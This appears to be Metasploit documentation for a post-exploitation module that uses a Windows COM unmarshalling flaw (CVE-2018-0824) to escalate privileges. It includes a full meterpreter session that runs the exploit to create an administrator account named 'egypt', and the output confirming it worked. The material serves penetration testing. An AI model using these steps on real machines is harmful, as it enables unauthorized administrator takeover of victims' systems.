## Overview
This is a post exploitation module for local privilege escalation bug
which exists in Microsoft COM for windows when it fails to properly
handle serialized objects.

* https://www.phpmyadmin.net/downloads/
* https://github.com/codewhitesec/UnmarshalPwn/
* https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-0824

## Options

"COMMAND" This command will be executed on successful escalation.</br>
"SESSION" The session to run this module on.

## Limitations

The payload will not spawn ant independent session it simply creates process with the system privilege.
If the system is not vulnerable, then payload will execute but new process will not spawn.

## Verification steps

If you want to confirm the vulnerability before you add user or perform any other sensitive action. 

1. `set COMMAND /s notepad.exe` 
2. `run` 

Confirmation:

Then go to meterpreter session and confirm running process (ps)
If you see notepad.exe running as SYSYEM then that is as indication of vulnerable system.

## Usage

```
meterpreter > sysinfo
Computer        : WIN10X64-1703
OS              : Windows 10 (Build 15063).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > execute -f cmd.exe -i -H
Process 4868 created.
Channel 7 created.
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Users\msfuser\Downloads>net user
net user

User accounts for \\WIN10X64-1703

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
msfuser                  
The command completed successfully.


C:\Users\msfuser\Downloads>exit           
exit
meterpreter > background
[*] Backgrounding session 1...
msf5 post(windows/escalate/unmarshal_cmd_exec) > show options

Module options (post/windows/escalate/unmarshal_cmd_exec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   COMMAND                        no        The command to execute as SYSTEM (Can only be a cmd.exe builtin or Windows binary, (net user /add %RAND% %RAND% & net localgroup administrators /add <user>).
   EXPLOIT_NAME                   no        The filename to use for the exploit binary (%RAND% by default).
   PATH                           no        Path to write binaries (%TEMP% by default).
   SCRIPT_NAME                    no        The filename to use for the COM script file (%RAND% by default).
   SESSION                        yes       The session to run this module on.

msf5 post(windows/escalate/unmarshal_cmd_exec) > set command 'net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt'
command => net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt
msf5 post(windows/escalate/unmarshal_cmd_exec) > set verbose true
verbose => true
msf5 post(windows/escalate/unmarshal_cmd_exec) > run

[!] SESSION may not be compatible with this module.
[*] Attempting to PrivEsc on WIN10X64-1703 via session ID: 1
[*] exploit path is: C:\Users\msfuser\AppData\Local\Temp\hylZVjgbLrd.exe
[*] script path is: C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct
[*] command is: net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt
[*] Attempting to PrivEsc on WIN10X64-1703 via session ID: 1
[*] Uploading Script to C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct
[*] Creating the sct file with command net user /add egypt h@ks4shellz  & net localgroup administrators /add egypt
[*] script_template_data.length =  306
[*] Writing 376 bytes to C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct to target
[*] Script uploaded successfully
[*] Uploading Exploit to C:\Users\msfuser\AppData\Local\Temp\hylZVjgbLrd.exe
[*] Exploit uploaded on WIN10X64-1703 to C:\Users\msfuser\AppData\Local\Temp\hylZVjgbLrd.exe
[*] Launching Exploit...
[*] Query for IStorage
Call:  Stat
End:  Stat
Query for IMarshal
Call:  GetMarshalSizeMax
Unknown IID: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 0000017F6C3E05B0
Query for IMarshal
Call:  GetUnmarshalClass
Call:  GetMarshalSizeMax
Call:  MarshalInterface
[+] Exploit Completed
[*] C:\Users\msfuser\AppData\Local\Temp\hylZVjgbLrd.exe already exists on the target. Deleting...
[*] Deleted C:\Users\msfuser\AppData\Local\Temp\hylZVjgbLrd.exe
[*] C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct already exists on the target. Deleting...
[*] Deleted C:\Users\msfuser\AppData\Local\Temp\NCYcABO.sct
[*] Post module execution completed
msf5 post(windows/escalate/unmarshal_cmd_exec) > sessions -i -1
[*] Starting interaction with 1...

meterpreter > execute -f cmd.exe -i -H
Process 1780 created.
Channel 11 created.
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.

C:\Users\msfuser\Downloads>net user 
net user

User accounts for \\WIN10X64-1703

-------------------------------------------------------------------------------
Administrator            DefaultAccount           egypt                    
Guest                    msfuser                  
The command completed successfully.


C:\Users\msfuser\Downloads>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
egypt
msfuser
The command completed successfully.


C:\Users\msfuser\Downloads>

```
